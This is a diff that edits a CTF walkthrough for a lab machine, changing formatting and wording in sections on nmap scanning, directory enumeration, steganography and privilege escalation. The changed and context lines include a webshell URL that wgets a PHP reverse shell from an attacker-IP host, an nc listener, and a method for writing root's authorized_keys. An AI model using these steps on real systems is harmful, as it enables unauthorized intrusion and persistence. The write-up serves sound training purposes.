@@ -8,18 +8,18 @@ Welcome to my walkthrough! This room is one of the most enjoyable CTFs I've comp
 First, deploy the target machine and connect via AttackBox or OpenVPN. I prefer OpenVPN, as it allows me to have my own familiar workspace and no time limit.
 
 
-For convenience, I am adding this room to /etc/hosts so I don't have to remember the IP address.
+For convenience, I am adding this room to **/etc/hosts** so I don't have to remember the IP address.
 
 ```sudo nano /etc/hosts```
 
 Once Nano is open, go to the end of the file and type the target IP address and the hostname (ua.thm). Your IP address will be different from mine, but it should follow this format:
-`10.10.159.59  ua.thm`. Once this has been added, type CTRL X and follow the directions to save the file.
+`10.10.159.59  ua.thm`. Once this has been added, type `CTRL X` and follow the directions to save the file.
 
-In case anyone needs context for this, /etc/hosts is a file that correlates IP addresses with hostnames. The operation we just performed means we can type "ua.thm" instead of the IP address when running future commands.
+In case anyone needs context for this, **/etc/hosts** is a file that correlates IP addresses with hostnames. The operation we just performed means we can type **"ua.thm"** instead of the IP address when running future commands.
 
 
 ## Port scan
-In nearly every CTF, I begin by performing a port scan with Nmap. Open your terminal in Kali Linux, then type `sudo nmap -sS ua.thm`
+In nearly every CTF, I begin by performing a port scan with **Nmap**. Open your terminal in Kali Linux, then type `sudo nmap -sS ua.thm`
 Your output should look like this:
 ```
 PORT   STATE SERVICE
@@ -72,7 +72,7 @@ The directory **/assets** is the most intriguing part of these results.
 ## Directory search explained
 If you are familiar with Gobuster, feel free to skip this part of the walkthrough. For those who are new to this, here are the concepts:
 
-A website (such as ua.thm) can have many components, and directories help organize these components. Consider a hypothetical website called http://example.com which serves as a shop. It might have a subdirectory called http://example.com/login, and this would serve as a login page. Similarly, http://example.com/search might allow a user to search for specific items.
+A website (such as ua.thm) can have many components, and directories help organize these components. Consider a hypothetical website called http://example.com which serves as a shop. It might have a directory called http://example.com/login, and this would serve as a login page. Similarly, http://example.com/search might allow a user to search for specific items.
 
 Gobuster takes a wordlist (in this case, a list of common directory names) and searches a website for them. Here is the breakdown of the command we used:
 
@@ -157,7 +157,7 @@ On your attacker machine, make sure you are in the same directory as your revers
 
 In the same directory, use `python3 -m http.server 80` so that your shell can be accessed through HTTP.
 
-Now, return to Firefox. You should still be viewing **http://ua.thm/assets/index.php?cmd=whoami**. Replace this with **http://ua.thm/assets/index.php?cmd=wget http://{ATTACKER-IP}/php-reverse-shell.php.** (Note that ATTACKER-IP should be replaced with the IP of your attacker machine.) In essence, we just used our remote command execution to download our php onto the target machine.
+Now, return to Firefox. You should still be viewing **http://ua.thm/assets/index.php?cmd=whoami**. Replace this with **http://ua.thm/assets/index.php?cmd=wget http://{ATTACKER-IP}/php-reverse-shell.php.** (Note that ATTACKER-IP should be replaced with the IP of your attacker machine.) In essence, we just used our remote command execution to download our php file onto the target machine.
 
 On your attacker machine, use `CTRL+C` to stop your Python server. Then enter `nc -nvlp 1234` to create a listener for your reverse shell.
 
@@ -244,7 +244,7 @@ Anyways, it looks like we have Deku's SSH password!
 ## Steganography explained
 Here is a deeper explanation if anyone needs it:
 
-**File signatures:** Hypothetically, we could name a file almost anything we wanted. For instance, a text file could be called example.jpg, though this would cause a lot of confusion. File signatures are how the system identifies the type of a file beyond just viewing its name. In this case **oneforall.jpg** initially had an incorrect file signature, which we determined based on attempting to view the image and by using **exiftool**. Exiftool is a common means of viewing basic image metadata in CTFs. **The main point** is that we could not extract information from the image until we fixed the file signature.
+**File signatures:** Hypothetically, we could name a file almost anything we wanted. For instance, a PNG file could be called example.jpg, though this would cause a lot of confusion. File signatures are how the system identifies the type of a file beyond just viewing its name. In this case **oneforall.jpg** initially had an incorrect file signature, which we determined based on attempting to view the image and by using **exiftool**. Exiftool is a common means of viewing basic image metadata in CTFs. **The main point** is that we could not extract information from the image until we fixed the file signature.
 
 **Hexedit:** This is the tool we used to replace the incorrect PNG header with the correct JPEG header. For context, I did not have these headers memorized; I merely referenced Wikipedia to find them.
 
@@ -313,7 +313,7 @@ I was initially overambitious and considered their file read command, but this w
 export LFILE=file_to_write
 bash -c 'echo DATA > $LFILE'
 ```
-I have already seen another writeup which used this trick to add a line to the sudoers file, but I chose to add my SSH key to the authorized_keys for root. Continue to the next section to learn more about this process.
+I have already seen another writeup which used this trick to add a line to the sudoers file, but I chose to add my SSH key to the authorized_keys for root. Both routes are perfectly viable ways to root this machine. Continue to the next section to learn more about this process.
 
 ## Creating SSH keys
 On your attacker machine, you can generate SSH keys by using the command `ssh-keygen -t rsa -b 4096 -f LOCATION/id_rsa`. (Note that I am using LOCATION as a placeholder for whatever location you might choose. If you're having trouble deciding, try **~/.ssh**.)
